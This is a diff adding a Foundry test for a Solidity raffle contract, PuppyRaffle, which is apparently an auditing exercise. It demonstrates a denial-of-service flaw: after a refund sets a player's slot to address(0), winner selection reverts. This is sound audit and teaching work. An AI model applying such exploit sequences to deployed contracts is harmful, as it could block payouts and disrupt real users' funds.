@@ -1,0 +1,80 @@
+// SPDX-License-Identifier: MIT
+/*A Denial of Service attack occurs when a malicious actor intentionally disrupts the normal functioning of a system, 
+making it unavailable to its intended users.
+
+/*
+The refund function allows a player to get their entrance fee back by calling this function and providing their index 
+in the players array. When a player calls refund, their address in the players array is set to address(0), indicating 
+that they have been refunded and are no longer an active participant.
+*/
+
+/*
+After the raffle duration has ended, and it's time to select a winner, the selectWinner function is called. 
+This function randomly selects an index from the players array to determine the winner.
+If one of the participants has called the refund function, their address in the players array is set to address(0).
+When the selectWinner function tries to select a winner, it may pick an index that corresponds to address(0). 
+This situation is problematic because address(0) is not a valid participant, and attempting to send the prize to address(0) 
+or mint an NFT to address(0) is not meaningful.
+*/
+pragma solidity ^0.7.6;
+pragma experimental ABIEncoderV2;
+
+import {Test, console} from "forge-std/Test.sol";
+import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+
+contract PuppyRaffleDOSTest is Test {
+    PuppyRaffle raffle;
+
+    address owner = address(this);
+    address player1 = address(0x1);
+    address player2 = address(0x2);
+    address player3 = address(0x3);
+    address player4 = address(0x4);
+    address feeAddress = address(0x5);
+    uint256 entranceFee = 1 ether;
+    uint256 raffleDuration = 1 days;
+
+    function setUp() public {
+        raffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
+        vm.warp(block.timestamp + 1 hours); // Fast forward time to ensure raffle can start
+
+        // Fund player1 with enough ETH to enter the raffle
+        vm.deal(player1, 5 ether);
+        vm.deal(player2, 5 ether);
+        vm.deal(player3, 5 ether);
+        vm.deal(player4, 5 ether);
+    }
+
+    function testSelectWinnerDoS() public {
+        // Player 1, 2, 3, and 4 enter the raffle
+        vm.startPrank(player1);
+        address[] memory players = new address[](4);
+        players[0] = player1;
+        players[1] = player2;
+        players[2] = player3;
+        players[3] = player4;
+        raffle.enterRaffle{value: entranceFee * 4}(players);
+        vm.stopPrank();
+
+        // Fast forward time to end the raffle duration
+        vm.warp(block.timestamp + raffleDuration);
+
+        // Player 1 calls refund
+        vm.startPrank(player1);
+        raffle.refund(0);
+        vm.stopPrank();
+
+        // Player 2 attempts to select a winner
+        vm.startPrank(player2);
+        try raffle.selectWinner() {
+            // If we reach here, the test should fail because it means the DoS did not work
+            console.log("Test failed: selectWinner did not fail as expected");
+            assert(false);
+        } catch Error(string memory reason) {
+            // Check that the error message is what we expect
+            console.log("selectWinner failed as expected with reason: ", reason);
+            assertEq(reason, "PuppyRaffle: Winner address is zero");
+        }
+        vm.stopPrank();
+    }
+}
